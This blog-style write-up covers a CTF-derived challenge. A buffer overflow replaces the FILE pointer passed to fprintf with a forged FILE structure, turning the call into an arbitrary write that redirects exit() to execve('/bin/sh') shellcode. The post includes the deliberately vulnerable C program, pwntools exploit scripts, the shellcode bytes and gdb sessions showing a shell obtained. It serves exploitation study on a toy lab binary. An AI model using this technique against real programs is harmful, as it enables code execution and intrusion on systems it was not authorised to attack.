---
layout: post
title: FILE structure exploitation with fprintf
---

## Foreword
This writeup does **not** explain the FILE structure itself, but instead, it explains how I exploited the `fprintf()` 
function to get arbitrary code execution.

## Summary
Using a forged FILE structure you can write arbitrary bytes by calling `fprintf`. This could lead to arbitrary code.
execution. 
This challenge has ASLR disabled.

## Resources/tools that I used
These resources helped me understand the FILE structure more:
- [FILE Structure Exploitation ('vtable' check bypass)][link-1]
- [Play with FILE Structure - Yet Another Binary Exploit Technique][link-2]
- [printf write-up (Tokyo Westerns CTF 2019)][link-3]
- [pwntools Docs][link-4]

## The code
The following code is a modified version of a CTF challenge I completed several days ago. 

```c
/* gcc -m32 -fno-stack-protector -no-pie vuln.c -o vuln -z execstack -Wl,-z,norelro -g */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc,char **argv)

{
  FILE *fp;
  size_t n;
  char buf[256];

  if (argc != 3) {
    printf("%s fp str\n",*argv);
    exit(-1);
  }
  fp = fopen(argv[1],"a");
  if (fp == (FILE *)0x0) {
    perror("fopen");
    exit(-1);
  }
  strcpy(buf, argv[2]);
  n = strlen(buf);
  memfrob(buf, n);

  fprintf(fp,"%s : %s\n",argv[1],buf);
  exit(0);
}
```

There is a buffer overflow that allows you to overwrite `fp` in `fprintf`, giving you full access over the `fprintf` 
function. `memfrob` xors everything of `buf` with `42` for `n` amount of bytes. This is just there to be able to give 
the program null bytes.

## Plan of action
First off, there are some routes you can take to potentially exploit this executable:
- Exploiting the `vtable` to call `system("/bin/sh")`
- Overwriting `exit()`'s function call to something else

I went for the latter option, because there is a protection in `vfprintf` that causes the program to abort when there 
is an invalid `vtable`.

In order to exploit this executable I need to do some things:
- find/get `exit()`'s PLT address, this is what will be overwritten by the shellcode address
- find a correct `vtable`, you need this because of the protection in `vprintf()`
- find a correct `lock`, this is an address pointing to NULL somewhere in memory
- create a correct FILE structure with the former points
- get the padding needed for the buffer overflow

## Gathering the required information
First task is getting `exit()`'s PLT address. To do this I simply used `gdb` with `peda`:

```
$ gdb ./vuln -q
Reading symbols from ./vuln...done.
gdb-peda$ disassemble exit
Dump of assembler code for function exit@plt:
   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x8049958
   0x080483f6 <+6>:     push   0x18
   0x080483fb <+11>:    jmp    0x80483b0
End of assembler dump.
gdb-peda$
```

So `exit()`'s PLT address is `0x8049958`. Now for a `vtable`. In a [writeup][link-3] I read, I noticed that 
`_IO_file_jumps` is some sort of `vtable`, so I tried looking for that:

```
$ gdb ./vuln -q
gdb-peda$ b *main
Breakpoint 1 at 0x8048576: file vuln.c, line 9.
gdb-peda$ r abc
Starting program: /home/student/Research/FILE_struct_exp/vuln abc
[----snip----]
gdb-peda$ p &_IO_file_jumps
$1 = (<data variable, no debug info> *) 0xf7fac860 <_IO_file_jumps>
gdb-peda$
```

The `vtable` that I'll use is at `0xf7fac860`. Only one thing left for the FILE structure, which is `lock`:

```
$ gdb ./vuln -q
Reading symbols from ./vuln...done.
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048576 <+0>:     lea    ecx,[esp+0x4]
   0x0804857a <+4>:     and    esp,0xfffffff0
   0x0804857d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048580 <+10>:    push   ebp
   0x08048581 <+11>:    mov    ebp,esp
   0x08048583 <+13>:    push   esi
[----snip----]
   0x08048655 <+223>:   lea    eax,[ebx-0x122d]
   0x0804865b <+229>:   push   eax
   0x0804865c <+230>:   push   DWORD PTR [ebp-0x1c]
   0x0804865f <+233>:   call   0x8048420 <fprintf@plt>
   0x08048664 <+238>:   add    esp,0x10
   0x08048667 <+241>:   sub    esp,0xc
   0x0804866a <+244>:   push   0x0
   0x0804866c <+246>:   call   0x80483f0 <exit@plt>
End of assembler dump.
gdb-peda$ b *main+233
Breakpoint 1 at 0x8048615: file vuln.c, line 24.
gdb-peda$ r abc
Starting program: /home/student/Research/FILE_struct_exp/vuln abc

[----------------------------------registers-----------------------------------]
EAX: 0x8048713 ("%s : %s\n")
EBX: 0x8049940 --> 0x8049854 --> 0x1 
ECX: 0xffffcf1c --> 0x0 
EDX: 0xffffcf18 ("^OY^")
ESI: 0xffffd050 --> 0x3 
EDI: 0x0 
EBP: 0xffffd038 --> 0x0 
ESP: 0xffffcf00 --> 0x804a160 --> 0xfbad3484 
EIP: 0x804865f (<main+233>:     call   0x8048420 <fprintf@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048655 <main+223>:        lea    eax,[ebx-0x122d]
   0x804865b <main+229>:        push   eax
   0x804865c <main+230>:        push   DWORD PTR [ebp-0x1c]
=> 0x804865f <main+233>:        call   0x8048420 <fprintf@plt>
   0x8048664 <main+238>:        add    esp,0x10
   0x8048667 <main+241>:        sub    esp,0xc
   0x804866a <main+244>:        push   0x0
   0x804866c <main+246>:        call   0x80483f0 <exit@plt>
Guessed arguments:
arg[0]: 0x804a160 --> 0xfbad3484 
arg[1]: 0x8048713 ("%s : %s\n")
arg[2]: 0xffffd2e4 --> 0x636261 ('abc')
arg[3]: 0xffffcf18 ("^OY^")
[------------------------------------stack-------------------------------------]
0000| 0xffffcf00 --> 0x804a160 --> 0xfbad3484 
0004| 0xffffcf04 --> 0x8048713 ("%s : %s\n")
0008| 0xffffcf08 --> 0xffffd2e4 --> 0x636261 ('abc')
0012| 0xffffcf0c --> 0xffffcf18 ("^OY^")
0016| 0xffffcf10 --> 0xf7fd0110 --> 0xf7dd9000 --> 0x464c457f 
0020| 0xffffcf14 --> 0xf7fdf73d (add    esp,0x20)
0024| 0xffffcf18 ("^OY^")
0028| 0xffffcf1c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804865f in main (argc=0x3, argv=0xffffd0e4) at vuln.c:27
27        fprintf(fp,"%s : %s\n",argv[1],buf);
gdb-peda$ p *fp
$1 = {
  _flags = 0xfbad3484, 
  _IO_read_ptr = 0x0, 
  _IO_read_end = 0x0, 
  _IO_read_base = 0x0, 
  _IO_write_base = 0x0, 
  _IO_write_ptr = 0x0, 
  _IO_write_end = 0x0, 
  _IO_buf_base = 0x0, 
  _IO_buf_end = 0x0, 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _markers = 0x0, 
  _chain = 0xf7faece0 <_IO_2_1_stderr_>, 
  _fileno = 0x3, 
  _flags2 = 0x0, 
  _old_offset = 0x0, 
  _cur_column = 0x0, 
  _vtable_offset = 0x0, 
  _shortbuf = "", 
  _lock = 0x804a1f8, 
  _offset = 0xffffffffffffffff, 
  __pad1 = 0x0, 
  __pad2 = 0x804a204, 
  __pad3 = 0x0, 
  __pad4 = 0x0, 
  __pad5 = 0x0, 
  _mode = 0x0, 
  _unused2 = '\000' <repeats 39 times>
}
```

`_lock` is at `0x804a1f8`. To test if I can write somewhere in memory, I will use a environment variable and change 
it's value.

```
$ export TEST=changeme
$ gdb ./vuln -q
Reading symbols from ./vuln...done.
gdb-peda$ b *main
Breakpoint 1 at 0x8048576: file vuln.c, line 9.
gdb-peda$ r abc test
gdb-peda$ find TEST
Searching for 'TEST' in: None ranges
Found 2 results, display max 2 items:
ld-2.27.so : 0xf7ff371b ("TEST")
   [stack] : 0xffffd991 ("TEST=changeme")
```

The address I'm going to write to is `0xffffd991`. Last but not least, the padding needed to overwrite the FILE 
pointer. To do this I used `pwntools`' `cyclic()`, `fit()` functions and `gdb` with `peda`:

pwntools:
```python
>>> from pwn import *
>>> def encrypt(p):
...  new_p = ''
...  for c in p:
...   new_p += chr(ord(c) ^ 42)
...  return new_p
...
>>> encrypt(cyclic(300))
'KKKKHKKKIKKKNKKKOKKKLKKKMKKKBKKKCKKK@KKKAKKKFKKKGKKKDKKKEKKKZKKK[KKKXKKKYKKK^KKK_KKK\\KKK]KKKRKKKSKKKPKKHHKKHIKKHNKKHOKKHLKKHMKKHBKKHCKKH@KKHAKKHFKKHGKKHDKKHEKKHZKKH[KKHXKKHYKKH^KKH_KKH\\KKH]KKHRKKHSKKHPKKIHKKIIKKINKKIOKKILKKIMKKIBKKICKKI@KKIAKKIFKKIGKKIDKKIEKKIZKKI[KKIXKKIYKKI^KKI_KKI\\KKI]KKIRKKISKKI
```

gdb:
```
$ gdb ./vuln -q
Reading symbols from ./vuln...done.
gdb-peda$ b *main+233
Breakpoint 1 at 0x804865f: file vuln.c, line 27.
gdb-peda$ r abc $(python -c "print 'KKKKHKKKIKKKNKKKOKKKLKKKMKKKBKKKCKKK@KKKAKKKFKKKGKKKDKKKEKKKZKKK[KKKXKKKYKKK^KKK_KKK\\KKK]KKKRKKKSKKKPKKHHKKHIKKHNKKHOKKHLKKHMKKHBKKHCKKH@KKH
AKKHFKKHGKKHDKKHEKKHZKKH[KKHXKKHYKKH^KKH_KKH\\KKH]KKHRKKHSKKHPKKIHKKIIKKINKKIOKKILKKIMKKIBKKICKKI@KKIAKKIFKKIGKKIDKKIEKKIZKKI[KKIXKKIYKKI^KKI_KKI\\KKI]KKIRKKISKKI'")
[-------------------------------------code-------------------------------------]
   0x8048655 <main+223>:        lea    eax,[ebx-0x122d]
   0x804865b <main+229>:        push   eax
   0x804865c <main+230>:        push   DWORD PTR [ebp-0x1c]
=> 0x804865f <main+233>:        call   0x8048420 <fprintf@plt>
   0x8048664 <main+238>:        add    esp,0x10
   0x8048667 <main+241>:        sub    esp,0xc
   0x804866a <main+244>:        push   0x0
   0x804866c <main+246>:        call   0x80483f0 <exit@plt>
Guessed arguments:
arg[0]: 0x63616170 ('paac')
arg[1]: 0x8048713 ("%s : %s\n")
arg[2]: 0xffffd1bd --> 0x636261 ('abc')
arg[3]: 0xffffcdf8 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
```

The FILE pointer was overwritten by `oaac`. Using pwntools' `fit()` function I can get the padding needed:
```python
>>> len(fit({'paac':''}))
260
>>>
```

## Creating a fake FILE structure
To create a fake FILE structure along with the padding I made a python script:
```python
from pwn import *

def encrypt(p):
    new_p = ''
    for c in p:
        new_p += chr(ord(c) ^ 42)
    return new_p


def forge_FILE_struct(_IO_buf_base = 0, \
        _IO_buf_end = 0, \
        chain = 0, \
        _lock = 0, \
        vtable = 0):
    forged_file = p32(0x0) # flags
    forged_file += p32(0x0) # _IO_read_ptr
    forged_file += p32(0x0) # _IO_read_end
    forged_file += p32(0x0) # _IO_read_base
    forged_file += p32(0x0) # _IO_write_base
    forged_file += p32(0x0) # _IO_write_ptr
    forged_file += p32(0x0) # _IO_write_end
    forged_file += p32(_IO_buf_base) # this is the address fprintf() will use
    forged_file += p32(_IO_buf_end)
    forged_file += p32(0x0) # _IO_save_base
    forged_file += p32(0x0) # _IO_backup_base
    forged_file += p32(0x0) # _IO_save_end
    forged_file += p32(0x0) # _markers
    forged_file += p32(chain)
    forged_file += p32(0x0) # fileno
    forged_file += p32(0x0) # _flags2
    forged_file += '' # _old_offset
    forged_file += p32(0x0) # _cur_colomn
    forged_file += p32(0x0) # _vtable_offset
    forged_file += '' # _shortbuf
    forged_file += p32(_lock)
    forged_file += p64(0xffffffffffffffff) # _offset
    forged_file += p32(0x0) # __pad1
    forged_file += p32(0x0) # __pad2
    forged_file += p32(0x0) # __pad3
    forged_file += p32(0x0) # __pad4
    forged_file += p32(0x0) # __pad5
    forged_file += p32(0x0) # _mode
    forged_file += '\x00'*40 # _unused
    forged_file += p32(vtable)
    return forged_file

exit_plt = 0x8049958
env_addr = 0xffffd992
struct_chain = 0xf7faece0
struct_lock = 0x804a1f8
struct_vtable = 0xf7fac860

payload_fd = forge_FILE_struct(_IO_buf_base = env_addr, \
        _IO_buf_end = env_addr+7, \
        chain =struct_chain, \
        _lock = struct_lock, \
        vtable = struct_vtable)

payload = 'FOOD' # everybody likes food 
payload += payload_fd
payload += '\x00'*(260 - len(payload)) # fill the rest of padding with \0
payload += p32(0xffffce1c) # forged FILE structure address

print(encrypt(payload))
```

The only things that matter in the FILE structure are `_IO_buf_base` and `_IO_buf_end`, this is where you are able to 
write to using `fprintf`. 
`_IO_buf_base` is the start of where you are going to write, and `_IO_buf_end` is the end of it. We need to make room for writing 7 bytes, 
because it also writes the format string (` : `).
`vtable` is for the `vfprintf` security measure.
In theory this should overwrite `TEST=changeme`, so I tested it in gdb.

```
$ gdb ./vuln -q
Reading symbols from ./vuln...done.
gdb-peda$ b *main+233
Breakpoint 1 at 0x804865f: file vuln.c, line 27.
gdb-peda$ r abc $(python exploit.py)
Starting program: /home/student/Research/FILE_struct_exp/vuln abc $(python exploit.py)
[-------------------------------------code-------------------------------------]
   0x8048655 <main+223>:        lea    eax,[ebx-0x122d]
   0x804865b <main+229>:        push   eax
   0x804865c <main+230>:        push   DWORD PTR [ebp-0x1c]
=> 0x804865f <main+233>:        call   0x8048420 <fprintf@plt>
   0x8048664 <main+238>:        add    esp,0x10
   0x8048667 <main+241>:        sub    esp,0xc
   0x804866a <main+244>:        push   0x0
   0x804866c <main+246>:        call   0x80483f0 <exit@plt>
Guessed arguments:
arg[0]: 0xffffce1c --> 0x0
arg[1]: 0x8048713 ("%s : %s\n")
arg[2]: 0xffffd1e0 --> 0x636261 ('abc')
arg[3]: 0xffffce18 ("FOOD")
Breakpoint 1, 0x0804865f in main (argc=0x3, argv=0xffffcfe4) at vuln.c:27
27        fprintf(fp,"%s : %s\n",argv[1],buf);
gdb-peda$ p *fp
$1 = {
  _flags = 0x0, 
  _IO_read_ptr = 0x0, 
  _IO_read_end = 0x0, 
  _IO_read_base = 0x0, 
  _IO_write_base = 0x0, 
  _IO_write_ptr = 0x0, 
  _IO_write_end = 0x0, 
  _IO_buf_base = 0xffffd991 "TEST=changeme", 
  _IO_buf_end = 0xffffd998 "angeme", 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _markers = 0x0, 
  _chain = 0xf7faece0 <_IO_2_1_stderr_>, 
  _fileno = 0x0, 
  _flags2 = 0x0, 
  _old_offset = 0x0, 
  _cur_column = 0x0, 
  _vtable_offset = 0x0, 
  _shortbuf = "", 
  _lock = 0x804a204, 
  _offset = 0xffffffffffffffff, 
  __pad1 = 0x0, 
  __pad2 = 0x0, 
  __pad3 = 0x0, 
  __pad4 = 0x0, 
  __pad5 = 0x0, 
  _mode = 0x0, 
  _unused2 = '\000' <repeats 39 times>
}
gdb-peda$ x/s 0xffffd991
0xffffd991:     "TEST=changeme"
gdb-peda$ ni
[----snip----]
gdb-peda$ x/s 0xffffd991
0xffffd991:     " : FOODangeme"
gdb-peda$
```

It worked! I just need to write to the address of `exit() - 3` and write the address of my shellcode.
I'm using a 
common execve("/bin/sh") shellcode:

```python
"\x31\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0@\xcd\x80"
```

and I am using `invoke.sh`to get a clean environment:

```bash
#!/bin/sh

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi
```

To get the address of `SHELLCODE` I used `gdb` for now:

```
$ ./invoke.sh -d -e SHELLCODE=$(python -c 'print "\x31\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0@\xcd\x80"') ./vul$
 abc $(python exploit.py)
Reading symbols from /home/student/Research/FILE_struct_exp/vuln...done.
(gdb) source /opt/peda/peda.py
gdb-peda$ b *main+233
Breakpoint 1 at 0x804865f: file vuln.c, line 27.
gdb-peda$ unset e
environment   exec-wrapper
gdb-peda$ unset environment COLUMNS
gdb-peda$ unset environment LINES
gdb-peda$ r
[-------------------------------------code-------------------------------------]
   0x8048655 <main+223>:        lea    eax,[ebx-0x122d]
   0x804865b <main+229>:        push   eax
   0x804865c <main+230>:        push   DWORD PTR [ebp-0x1c]
=> 0x804865f <main+233>:        call   0x8048420 <fprintf@plt>
   0x8048664 <main+238>:        add    esp,0x10
   0x8048667 <main+241>:        sub    esp,0xc
   0x804866a <main+244>:        push   0x0
   0x804866c <main+246>:        call   0x80483f0 <exit@plt>
Guessed arguments:
arg[0]: 0xffffce1c --> 0x0
arg[1]: 0x8048713 ("%s : %s\n")
arg[2]: 0xffffde61 --> 0x636261 ('abc')
arg[3]: 0xffffdb78 ("FOOD")

Breakpoint 1, 0x0804865f in main (argc=0x3, argv=0xffffdd44) at vuln.c:27
27        fprintf(fp,"%s : %s\n",argv[1],buf);
gdb-peda$ find SHELLCODE
Searching for 'SHELLCODE' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xffffdfa5 ("SHELLCODE=1\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200")
gdb-peda$ p/x 0xffffdb78+4
$2 = 0xffffdb7c
gdb-peda$
```

The address of the shellcode is at `0xffffdfaf` (0xffffdfa5 + 10) but the address of my fake file structure also 
changed to `0xffffdb7c`. As a result, a slight modification to the exploit script is needed:

```python
exit_plt = 0x8049958
env_addr = 0xffffd991
shellcode_addr = 0xffffdfaf
struct_chain = 0xf7faece0
struct_lock = 0x804a204
struct_vtable = 0xf7fac860

payload_fd = forge_FILE_struct(_IO_buf_base = exit_plt-3, \
        _IO_buf_end = exit_plt+4, \
        chain =struct_chain, \
        _lock = struct_lock, \
        vtable = struct_vtable)

payload = p32(shellcode_addr)
payload += payload_fd
payload += '\x00'*(260 - len(payload))
payload += p32(0xffffdb7c) # forged FILE structure address

print(encrypt(payload))
```
`_IO_buf_end` is to indicate the end of the write.
When trying it out it looked to have worked:

```
./invoke.sh -d -e SHELLCODE=$(python -c 'print "\x31\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0@\xcd\x80"') ./vuln abc $(python exploit.py)
(gdb) source /opt/peda/peda.py 
gdb-peda$ unset environment COLUMNS
gdb-peda$ unset environment LINES  
gdb-peda$ b *main+246 
Breakpoint 1 at 0x804866c: file vuln.c, line 28.
gdb-peda$ r
[----snip----]
gdb-peda$ si
[-------------------------------------code-------------------------------------]
   0x80483e0 <strcpy@plt>:      jmp    DWORD PTR ds:0x8049954
   0x80483e6 <strcpy@plt+6>:    push   0x10
   0x80483eb <strcpy@plt+11>:   jmp    0x80483b0
=> 0x80483f0 <exit@plt>:        jmp    DWORD PTR ds:0x8049958
 | 0x80483f6 <exit@plt+6>:      push   0x18
 | 0x80483fb <exit@plt+11>:     jmp    0x80483b0
 | 0x8048400 <strlen@plt>:      jmp    DWORD PTR ds:0x804995c
 | 0x8048406 <strlen@plt+6>:    push   0x20
 |->   0xffffdfaf:      xor    eax,eax
       0xffffdfb1:      push   eax
       0xffffdfb2:      push   0x68732f2f
       0xffffdfb7:      push   0x6e69622f
                                                                  JUMP is taken
0x080483f0 in exit@plt ()
gdb-peda$ si
[-------------------------------------code-------------------------------------]
=> 0xffffdfaf:  xor    eax,eax
   0xffffdfb1:  push   eax
   0xffffdfb2:  push   0x68732f2f
   0xffffdfb7:  push   0x6e69622f
0xffffdfaf in ?? ()
gdb-peda$ c
Continuing.
process 10672 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```

## Making it work outside of a debugger
To get the different addresses that are used outside of `gdb` I used `getenvaddr`, `ltrace` and `gdb`:
```c
/* compiled with: gcc getenvaddr.c -m32 -o getenvaddr */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]); /* get env var location */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

and called with `invoke.sh`:

```
$ ./invoke.sh -e SHELLCODE=$(python -c 'print "\x90"*15 + "\x31\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0@\xcd\x80"') /usr/bin/ltrace ./vuln abc $(python exploit.py)
__libc_start_main(0x8048576, 3, 0xffffdd84, 0x8048680 <unfinished ...>
```
```
$ gdb -c core -q
[New LWP 42081]
Core was generated by `/home/student/Research/FILE_struct_exp/vuln abc kkkk***************************'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xf7e2177c in ?? ()
gdb-peda$ symbol-file vuln
Reading symbols from vuln...done.
gdb-peda$ sharedlibrary
Reading symbols from /lib32/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
gdb-peda$ thread apply all bt full
Thread 1 (LWP 42081):
#0  0xf7e2177c in vfprintf () from /lib32/libc.so.6
No symbol table info available.
#1  0xf7e29b58 in fprintf () from /lib32/libc.so.6
No symbol table info available.
#2  0x08048664 in main (argc=0x3, argv=0xffffdd34) at vuln.c:27
        fp = 0xffffda68
        n = 0x2a2a2b22
        buf = "AAAA", '\000' <repeats 28 times>, "U\231\004\b\\\231\004\b", '\000' <repeats 16 times>, "\340\354\372\367", '\000' <repeats 16 times>, "\004\242\004\b\377\377\377
\377\377\377\377\377", '\000' <repeats 64 times>, "`\310\372\367", '\000' <repeats 99 times>
#3  0xf7df1e81 in __libc_start_main () from /lib32/libc.so.6
No symbol table info available.
#4  0x08048492 in _start ()
No symbol table info available.
gdb-peda$ print (char ***) & environ
$1 = (char ***) 0xf7fafdd8 <environ>
gdb-peda$ p $1[0][0]@100
$2 = {
  0xffffdf5f "SHELLCODE=", '\220' <repeats 15 times>, "\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", 0xffffdf95 "TERM=screen",
  0xffffdfa1 "PWD=/home/student/Research/FILE_struct_exp", 0x0,
  0x20 <error: Cannot access memory at address 0x20>,
  0xf7fd5b50 <__kernel_vsyscall> "QRU\211\345\017\064̀]ZYÐ\220\220\220\353\r", '\220' <repeats 13 times>, "X\270w", 0x21 <error: Cannot access memory at address 0x21>,
  0xf7fd5000 "\177ELF\001\001\001",
  0x10 <error: Cannot access memory at address 0x10>,
  0xf8bfbff <error: Cannot access memory at address 0xf8bfbff>,
  0x6 <error: Cannot access memory at address 0x6>,
[----snip----]
```

the shellcode is at `0xffffdf69` (0xffffdf5f + 10).  modification to the exploit script I can test it out:

```python
exit_plt = 0x8049958
shellcode_addr = 0xffffdf69
struct_chain = 0xf7faece0
struct_lock = 0x804a204
struct_vtable = 0xf7fac860

payload_fd = forge_FILE_struct(_IO_buf_base = exit_plt-3, \
        _IO_buf_end = exit_plt+4, \
        chain =struct_chain, \
        _lock = struct_lock, \
        vtable = struct_vtable)

payload = p32(shellcode_addr)
payload += payload_fd
payload += '\x00'*(260 - len(payload))
payload += p32((0xffffdbb8-80)+4) # forged FILE structure address


print(encrypt(payload))
```

```
student@ubuntu:~/Research/FILE_struct_exp$ ./invoke.sh -e SHELLCODE=$(python -c 'print "\x90"*15 + "\x31\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0@\xcd\x80"') ./vuln abc $(python exploit.py)
abc : i
$ whoami
student
$ exit
```

Success!

[link-1]: https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
[link-2]: https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
[link-3]: https://blog.bushwhackers.ru/tokyo2019-printf/
[link-4]: http://docs.pwntools.com/en/stable/
